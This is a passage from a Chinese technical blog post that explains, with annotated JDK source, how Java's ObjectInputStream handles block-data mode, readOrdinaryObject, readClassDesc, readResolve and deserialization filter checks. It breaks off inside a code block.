<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 记录进入前是否在“块数据模式”（Block-Data mode）：</span></span><br><span class="line"><span class="comment">// - 在自定义 readObject(..)/readExternal(..) 内部读取原始数据时，通常处于块模式；</span></span><br><span class="line"><span class="comment">// - 要读取“结构化标记”（TC_*）前，需要切到“非块模式”来取类型码。</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">oldMode</span> <span class="operator">=</span> bin.getBlockDataMode();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果检测的结果是 Data Block 模式，则满足下面两种情况之一则抛出 <code>java.io.OptionalDataException</code> 异常信息。</p>
<ul>
<li>字节流中剩余的字节数量 <code>currentBlockRemaining</code> 大于 0，也就是你<strong>当前还在块里，而且还有字节没读完</strong>。</li>
<li><code>defaultDataEnd</code> 的值为 <code>true</code>，也就是虽然块里的字节已经读完了，但因为写入端<strong>没有明确写 TC_ENDBLOCKDATA</strong>，所以我（读取端）需要**主动抛一个 <code>OptionalDataException(eof=true)</code>**，告诉你‘块已经结束了’。</li>
</ul>
<p>也就是说这里的意思是<strong>你还处在“块数据模式”中，不能直接读取对象（结构化数据），必须先处理完块数据或者正确结束块。否则我抛 <code>OptionalDataException</code> 提醒你怎么做</strong>。</p>
<p>经过这些判断后，会在 if 分支的最后关闭 Data Block 模式。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 记录进入前是否在“块数据模式”（Block-Data mode）：</span></span><br><span class="line"><span class="comment">// - 在自定义 readObject(..)/readExternal(..) 内部读取原始数据时，通常处于块模式；</span></span><br><span class="line"><span class="comment">// - 要读取“结构化标记”（TC_*）前，需要切到“非块模式”来取类型码。</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">oldMode</span> <span class="operator">=</span> bin.getBlockDataMode();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">    <span class="comment">// 仍在一个未消费完的“块”里</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">remain</span> <span class="operator">=</span> bin.currentBlockRemaining();</span><br><span class="line">    <span class="keyword">if</span> (remain &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 情形 1：块里仍有 N 字节未读，但此时调用方却想读“对象”</span></span><br><span class="line">        <span class="comment">// → 按规范抛出 OptionalDataException(N)，提示还有 N 字节原始数据待消费</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OptionalDataException</span>(remain);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (defaultDataEnd) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 修复 4360508：</span></span><br><span class="line"><span class="comment">         * 当前位于“默认序列化字段数据”的块末尾；该数据段没有显式的 TC_ENDBLOCKDATA，</span></span><br><span class="line"><span class="comment">         * 这里模拟“自定义数据结束”的行为，抛出 OptionalDataException(eof=true)，</span></span><br><span class="line"><span class="comment">         * 让上层的 readObject(..) 正确收尾。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OptionalDataException</span>(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 已经不在块中（remain==0 且非 defaultDataEnd），切换到“非块模式”以读取类型码</span></span><br><span class="line">    bin.setBlockDataMode(<span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后针对不同类型的反序列化数据，会进入不同的分支进行反序列化。对于对象类型进入的是 <code>readOrdinaryObject</code> 函数进行反序列化。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> TC_OBJECT:</span><br><span class="line">    <span class="comment">// 常规对象：分派到“普通可序列化 / Externalizable / 自定义 readObject”路径</span></span><br><span class="line">    <span class="keyword">return</span> checkResolve(readOrdinaryObject(unshared));</span><br></pre></td></tr></table></figure></div>

<h4 id="readOrdinaryObject"><a href="#readOrdinaryObject" class="headerlink" title="readOrdinaryObject"></a>readOrdinaryObject</h4><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 读取并返回一个“普通对象”（ordinary object）：</span></span><br><span class="line"><span class="comment"> * 非 String、非 Class、非 ObjectStreamClass、非数组、非枚举。</span></span><br><span class="line"><span class="comment"> * 若该对象的运行时类无法解析（类缺失），返回 null，并把 ClassNotFoundException</span></span><br><span class="line"><span class="comment"> * 绑定在该对象的句柄上（handles），调用方随后会感知并抛出异常。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 读取完成后，passHandle 会被设置为此对象分配到的句柄。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> unshared 是否采用“非共享”语义（对应 readUnshared）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Object <span class="title function_">readOrdinaryObject</span><span class="params">(<span class="type">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 期望当前位置是一个“对象起始”标记</span></span><br><span class="line">    <span class="keyword">if</span> (bin.readByte() != TC_OBJECT) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InternalError</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取类描述符（可能是 TC_CLASSDESC 或 TC_PROXYCLASSDESC），并完成若干一致性校验</span></span><br><span class="line">    <span class="type">ObjectStreamClass</span> <span class="variable">desc</span> <span class="operator">=</span> readClassDesc(<span class="literal">false</span>);</span><br><span class="line">    desc.checkDeserialize(); <span class="comment">// 检查该类是否允许反序列化、接口/构造器/版本等条件（不满足会抛 InvalidClassException）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 拿到运行时类</span></span><br><span class="line">    Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line">    <span class="comment">// “普通对象”路径不应该出现这些类型；若遇到说明协议/编码路径出错</span></span><br><span class="line">    <span class="keyword">if</span> (cl == String.class || cl == Class.class || cl == ObjectStreamClass.class) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;invalid class descriptor&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配实例：</span></span><br><span class="line">    <span class="comment">// - 对于 Serializable：使用反射工厂“分配但不执行构造器”（specially crafted ctor）</span></span><br><span class="line">    <span class="comment">// - 对于 Externalizable：调用 public 无参构造器</span></span><br><span class="line">    Object obj;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        obj = desc.isInstantiable() ? desc.newInstance() : <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">            desc.forClass().getName(), <span class="string">&quot;unable to create instance&quot;</span>).initCause(ex);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 为该对象分配/登记句柄：</span></span><br><span class="line">    <span class="comment">// - 共享语义：登记 obj 本身</span></span><br><span class="line">    <span class="comment">// - 非共享语义：登记特殊标记 unsharedMarker（禁止后续引用回指）</span></span><br><span class="line">    passHandle = handles.assign(unshared ? unsharedMarker : obj);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若类解析阶段曾记录过 ClassNotFoundException，则把异常绑定到该句柄</span></span><br><span class="line">    <span class="type">ClassNotFoundException</span> <span class="variable">resolveEx</span> <span class="operator">=</span> desc.getResolveException();</span><br><span class="line">    <span class="keyword">if</span> (resolveEx != <span class="literal">null</span>) &#123;</span><br><span class="line">        handles.markException(passHandle, resolveEx);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取“实例数据区”</span></span><br><span class="line">    <span class="keyword">if</span> (desc.isExternalizable()) &#123;</span><br><span class="line">        <span class="comment">// Externalizable：由对象自己的 readExternal 完全掌控读取</span></span><br><span class="line">        readExternalData((Externalizable) obj, desc);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Serializable：逐层（父→子）读取</span></span><br><span class="line">        <span class="comment">// - 若声明了 readObject：进入块数据模式读“自定义区”，直到 TC_ENDBLOCKDATA</span></span><br><span class="line">        <span class="comment">// - 否则：按字段表默认读取（原始类型/对象字段）</span></span><br><span class="line">        readSerialData(obj, desc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 标记本句柄完成构建（便于触发校验回调依赖、清理临时状态等）</span></span><br><span class="line">    handles.finish(passHandle);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// readResolve：若定义了私有 readResolve()，允许把 obj 替换为“解析后对象”</span></span><br><span class="line">    <span class="keyword">if</span> (obj != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">        handles.lookupException(passHandle) == <span class="literal">null</span> &amp;&amp;   <span class="comment">// 构建期间无解析异常</span></span><br><span class="line">        desc.hasReadResolveMethod())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">rep</span> <span class="operator">=</span> desc.invokeReadResolve(obj);        <span class="comment">// 可能返回同一对象或一个替代对象</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 非共享语义 + 返回的是数组：为保证“对象身份不共享”，对数组做一次克隆</span></span><br><span class="line">        <span class="keyword">if</span> (unshared &amp;&amp; rep.getClass().isArray()) &#123;</span><br><span class="line">            rep = cloneArray(rep);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (rep != obj) &#123;</span><br><span class="line">            <span class="comment">// 反序列化过滤器检查（JDK9+）：对替代对象做类/长度等策略校验</span></span><br><span class="line">            <span class="keyword">if</span> (rep != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (rep.getClass().isArray()) &#123;</span><br><span class="line">                    filterCheck(rep.getClass(), Array.getLength(rep));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    filterCheck(rep.getClass(), -<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 用替代对象更新句柄表与返回值</span></span><br><span class="line">            handles.setObject(passHandle, obj = rep);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先会再次判断读到的标识是不是 <code>TC_OBJECT</code>，如果不是，那么直接抛出 <code>InternalError</code> 错误。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 期望当前位置是一个“对象起始”标记</span></span><br><span class="line"><span class="keyword">if</span> (bin.readByte() != TC_OBJECT) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InternalError</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后调用 <code>readClassDesc</code> 函数系统中读取当前 Java 对象所属类的描述信息。在这个过程中会完成本地类加载，并且 JEP290 也是在这一步进行检查的。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 读取类描述符（可能是 TC_CLASSDESC 或 TC_PROXYCLASSDESC），并完成若干一致性校验</span></span><br><span class="line"><span class="type">ObjectStreamClass</span> <span class="variable">desc</span> <span class="operator">=</span> readClassDesc(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure></div>

<p>然后和序列化开始时类似，同样检测当前处理的对象是否是一个可反序列化的对象（<code>checkDeserialize()</code>），如果是，那么就从中读取当前 Java 对象所属类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">desc.checkDeserialize(); <span class="comment">// 检查该类是否允许反序列化、接口/构造器/版本等条件（不满足会抛 InvalidClassException）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 拿到运行时类</span></span><br><span class="line">Class&lt;?&gt; cl = desc.forClass();</span><br></pre></td></tr></table></figure></div>

<p>紧接着是<strong>“协议一致性保护”</strong>——这些类型<strong>不应该出现在普通对象路径里</strong>，若出现说明编码&#x2F;协议有误（例如手工构造了非法流）。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (cl == String.class || cl == Class.class || cl == ObjectStreamClass.class) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;invalid class descriptor&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后这一段使用了 <code>ObjectStreamClass</code> 的方法 <code>newInstance()</code> 创建类的实例。并且为当前构建的对象分配一个句柄（handle），并记录在 <code>passHandle</code> 中</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Object obj;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    obj = desc.isInstantiable() ? desc.newInstance() : <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">    <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">        desc.forClass().getName(), <span class="string">&quot;unable to create instance&quot;</span>).initCause(ex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">passHandle = handles.assign(unshared ? unsharedMarker : obj);</span><br></pre></td></tr></table></figure></div>

<p>如果在 <code>desc.forClass()</code> 阶段遇到了 <code>ClassNotFoundException</code>，这里将它挂在句柄上；稍后如果有其它对象依赖此句柄，会一起抛出 <code>WriteAbortedException</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassNotFoundException</span> <span class="variable">resolveEx</span> <span class="operator">=</span> desc.getResolveException();</span><br><span class="line"><span class="keyword">if</span> (resolveEx != <span class="literal">null</span>) &#123;</span><br><span class="line">    handles.markException(passHandle, resolveEx);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>若对象是 <code>Externalizable</code>，直接调用 <code>readExternal()</code>（需读块数据）；否则按 <code>ObjectStreamClass</code> 的类层级，自上而下读取：</p>
<ul>
<li>若某一层有 <code>readObject()</code>，进入块模式、调用该方法</li>
<li>否则默认读取该层字段（primitive + object）</li>
</ul>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (desc.isExternalizable()) &#123;</span><br><span class="line">    readExternalData((Externalizable) obj, desc);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    readSerialData(obj, desc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>将 <code>passHandle</code> 状态从 <code>READING → OK</code> 允许后续的 <code>TC_REFERENCE</code> 安全回引，同时触发依赖当前句柄的等待者的状态更新（用于异常传播&#x2F;校验依赖）。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handles.finish(passHandle);</span><br></pre></td></tr></table></figure></div>

<p>若定义了 <code>private Object readResolve()</code> 方法，会被调用，用于替换成枚举常量、缓存实例、代理对象等。如单例类在反序列化后替换回原始单例对象。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (obj != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">    handles.lookupException(passHandle) == <span class="literal">null</span> &amp;&amp;</span><br><span class="line">    desc.hasReadResolveMethod())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">rep</span> <span class="operator">=</span> desc.invokeReadResolve(obj); <span class="comment">// 返回可能是 obj 本身或另一个替代对象</span></span><br></pre></td></tr></table></figure></div>

<p>如果是 <code>readUnshared()</code> 路径 + 替代对象是数组，那么数组要做 <code>clone()</code>，避免共享引用。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unshared &amp;&amp; rep.getClass().isArray()) &#123;</span><br><span class="line">    rep = cloneArray(rep);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果 <code>readResolve</code> 返回的不是原对象（说明替换了），且开启了 <code>ObjectInputFilter</code>，则执行安全策略检查。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (rep != obj) &#123;</span><br><span class="line">    <span class="keyword">if</span> (rep != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (rep.getClass().isArray()) &#123;</span><br><span class="line">            filterCheck(rep.getClass(), Array.getLength(rep));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            filterCheck(rep.getClass(), -<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    handles.setObject(passHandle, obj = rep);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="readClassDesc"><a href="#readClassDesc" class="headerlink" title="readClassDesc"></a>readClassDesc</h4><p><code>readClassDesc</code> 根据数据类型调用对应的函数读取类描述信息。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 读取并返回（可能为 null 的）“类描述符”（ObjectStreamClass，简称 OSC）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 语义要点：</span></span><br><span class="line"><span class="comment"> * - 本方法会把当前位置的类型码（TC_*）解析为一个类描述符：</span></span><br><span class="line"><span class="comment"> *   * TC_NULL              → 返回 null；</span></span><br><span class="line"><span class="comment"> *   * TC_REFERENCE         → 返回之前读过并缓存的 OSC（句柄回引）；</span></span><br><span class="line"><span class="comment"> *   * TC_PROXYCLASSDESC    → 读取“动态代理类”的描述符；</span></span><br><span class="line"><span class="comment"> *   * TC_CLASSDESC         → 读取“普通类（非代理）”的描述符。</span></span><br><span class="line"><span class="comment"> * - 读取完成后，&#123;<span class="doctag">@code</span> passHandle&#125; 会被设置为“该类描述符对象”的句柄 ID</span></span><br><span class="line"><span class="comment"> *   （在 TC_NULL 时通常设置为特殊值）。</span></span><br><span class="line"><span class="comment"> * - 若该描述符无法在本地 JVM 解析为 Class（类缺失/类加载失败），则会把</span></span><br><span class="line"><span class="comment"> *   &#123;<span class="doctag">@link</span> ClassNotFoundException&#125; 绑定到该描述符对应的句柄上；上层在合适的位置</span></span><br><span class="line"><span class="comment"> *   会重新抛出该异常。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> unshared 是否采用“非共享”语义（readUnshared 场景下为 true）；</span></span><br><span class="line"><span class="comment"> *                 对于类描述符通常仍走共享语义，遇到 TC_REFERENCE 时会有额外检查。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 读取到的 ObjectStreamClass 或 null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException                  I/O 或协议读取错误</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> StreamCorruptedException     类型码非法/流控制信息不一致</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> ObjectStreamClass <span class="title function_">readClassDesc</span><span class="params">(<span class="type">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 先窥视一个字节（不消费），判断接下来要读的是哪一种“类描述相关结构”</span></span><br><span class="line">    <span class="type">byte</span> <span class="variable">tc</span> <span class="operator">=</span> bin.peekByte();</span><br><span class="line">    ObjectStreamClass descriptor;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (tc) &#123;</span><br><span class="line">        <span class="keyword">case</span> TC_NULL:</span><br><span class="line">            <span class="comment">// 空引用：消费并返回 null；passHandle 会相应更新为“无效句柄”</span></span><br><span class="line">            descriptor = (ObjectStreamClass) readNull();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> TC_REFERENCE:</span><br><span class="line">            <span class="comment">// 句柄回引：消费并从句柄表中取回之前读取过的类描述符</span></span><br><span class="line">            <span class="comment">// （若为 unshared 语义，会做“不允许别名共享”的校验）</span></span><br><span class="line">            descriptor = (ObjectStreamClass) readHandle(unshared);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> TC_PROXYCLASSDESC:</span><br><span class="line">            <span class="comment">// 动态代理类的类描述符：读取接口列表、注解块、父类描述符等</span></span><br><span class="line">            descriptor = readProxyDesc(unshared);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> TC_CLASSDESC:</span><br><span class="line">            <span class="comment">// 普通类（非代理）的类描述符：读取类名、SUID、flags、字段表、注解块、父类描述符等</span></span><br><span class="line">            descriptor = readNonProxyDesc(unshared);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="comment">// 在“期待类描述符”的位置读到未知类型码 → 流已损坏或写入端不遵守协议</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(</span><br><span class="line">                String.format(<span class="string">&quot;invalid type code: %02X&quot;</span>, tc));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若成功得到一个非空的描述符，做一次一致性/安全校验（可能结合反序列化过滤器等）</span></span><br><span class="line">    <span class="keyword">if</span> (descriptor != <span class="literal">null</span>) &#123;</span><br><span class="line">        validateDescriptor(descriptor);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> descriptor;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里读取类描述信息的过程跟之前序列化过程相反，主要是根据序列化数据中的类描述信息创建一个 <code>ObjectStreamClass</code> 返回。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 